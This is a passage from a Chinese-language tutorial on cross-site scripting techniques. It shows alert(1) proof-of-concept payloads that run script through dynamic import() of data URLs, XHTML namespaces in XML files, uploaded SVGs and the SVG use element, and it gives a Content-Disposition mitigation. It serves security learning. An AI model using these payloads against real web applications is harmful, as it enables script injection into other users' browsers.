    ## 动态导入


    Javascript 允许你使用 `import()` 动态加载模块，它就像一个普通函数，不同在于它允许 JavaScript 引擎选择是否实际需要它。这种函数形式的允许你指定要导入的
    URL，它允许你指定一个数据 URL 来执行任意 JavaScript：


    ```javascript

    import(''data:text/javascript,alert(1)'')

    ```


    ## XML 中的 XHTML 命名空间


    如果你可以控制内容类型为 `text/xml` 的 XML 文件，只要提供一个 XHTML 命名空间，仍然可以执行 JavaScript。然而，仅在 `img`
    元素上添加一个名称就会使其被渲染为 XHTML：


    ```xml

    <xml>

    <text>hello<img src="1" onerror="alert(1)" /></text>

    </xml>

    ```


    如果没有命名空间，浏览器将把上述代码作为 XML 渲染并显示 XML 视图。


    ```xml

    <xml>

    <text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml"
    /> </text>

    </xml>

    ```


    这对于文件上传或者当你控制使用 XML 内容类型服务的 REST API 响应时非常有用。


    ## SVG 上传


    在 Web 应用中允许上传图像文件是很常见的，但许多人忘记了可以在上传的 SVG 文档中使用脚本。与 SVG 不同，当使用具有正确 MIME 类型的 SVG
    时，解析会更加严格。这意味着你需要确保添加了正确的命名空间属性，并且它应该符合 XML 解析规则，例如，所有属性都应该被引号引用。


    ```svg

    <svg id=''x'' xmlns=''http://www.w3.org/2000/svg'' xmlns:link=''http://www.w3.org/1999/x''

    width=''100'' height=''100''>

    <image href="1" onerror=''alert(1)'' />

    </svg>

    ```


    你可以通过显式过滤 SVG 来防止这种利用，但如果你无法这样做，你始终可以通过带有 `Content-Disposition` 头部和 `attachment`
    值来提供文件：


    Content-Disposition: attachment


    这应该阻止 SVG 在现代浏览器中渲染。但有一个例外：如果通过 `<use>` 元素嵌入，它仍然会被渲染。


    ## SVG use 元素


    如上所述，你可以通过使用 `<use>` 元素嵌入 SVG 文档来使用 JavaScript 执行。只要文档位于同一域，这种方法就有效。你也可以使用数据 URL，我将在下面演示这一点：


    ```html

    <svg href="data:image/svg+xml,&lt;svg id=''x'' xmlns=''http://www.w3.org/2000/svg\n&gt;&lt;image
    href=''1'' onerror=''alert(1)''&gt;&lt;/svg&gt;*x" />

    ```


    注意，因为使用有效 SVG MIME 类型的数据 URL 遵循更严格的规则。同样值得，尽管这是一个数据 URL，但它不会从空源（null origin）执行，它将继承页面的源。


